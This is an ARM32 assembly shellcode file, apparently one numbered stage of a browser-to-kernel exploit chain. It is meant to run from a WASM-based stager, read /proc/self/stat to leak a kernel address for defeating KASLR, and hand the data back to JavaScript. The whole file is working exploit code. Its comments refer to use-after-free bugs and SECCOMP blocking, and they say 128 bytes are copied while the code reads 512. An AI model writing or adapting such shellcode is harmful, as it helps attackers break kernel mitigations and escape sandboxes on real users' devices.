/*
 * proc_stat_leak.s — Test /proc/self/stat readability for KASLR leak
 * ARM32 EABI shellcode
 *
 * v18: Read /proc/self/stat to extract wchan (kernel address).
 * If readable, the wchan field reveals the KASLR slide.
 * This is non-destructive — no UAF needed.
 *
 * Sequence:
 *   A1: openat("/proc/self/stat", O_RDONLY)
 *   A2: read(fd, buf, 512) — read stat contents
 *   A3: close(fd)
 *   A4: Copy first 128 bytes to WASM memory at offset 0x1000
 *       for JavaScript to parse
 *   Return 0xDD00 | bytes_read (success)
 *
 * Return value:
 *   0xDD00-DDFF = success, low byte = bytes read (capped at 255)
 *   0xE100 = openat /proc/self/stat failed (SECCOMP blocked?)
 *   0xE200 = read failed
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ O_RDONLY,  0
.equ FRAME,     48

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    /* R4 = wasm_mem base (passed from stager via BX R4) */
    mov     r10, r4

    /* A1: openat(AT_FDCWD, "/proc/self/stat", O_RDONLY) */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, str_proc_stat
    mov     r2, #O_RDONLY
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_e1
    mov     r4, r0              /* R4 = stat_fd */

    /* A2: read(stat_fd, wasm_mem+0x1000, 512) */
    mov     r0, r4
    add     r1, r10, #0x1000    /* buffer in WASM memory */
    mov     r2, #512
    mov     r7, #3              /* __NR_read */
    svc     #0
    cmp     r0, #0
    ble     fail_e2
    mov     r5, r0              /* R5 = bytes read */

    /* A3: close(stat_fd) */
    mov     r0, r4
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* A4: null-terminate the buffer */
    add     r0, r10, #0x1000
    add     r0, r0, r5
    mov     r1, #0
    strb    r1, [r0]

    /* Return 0xDD00 | min(bytes_read, 255) */
    cmp     r5, #255
    movgt   r5, #255
    mov     r0, #0xDD00
    orr     r0, r0, r5
    b       done

fail_e1:
    rsb     r0, r0, #0
    mov     r1, #0xE100
    orr     r0, r0, r1
    b       done
fail_e2:
    rsb     r0, r0, #0
    mov     r1, #0xE200
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* Data */
    .align 2
str_proc_stat:
    .asciz  "/proc/self/stat"
    .align  2
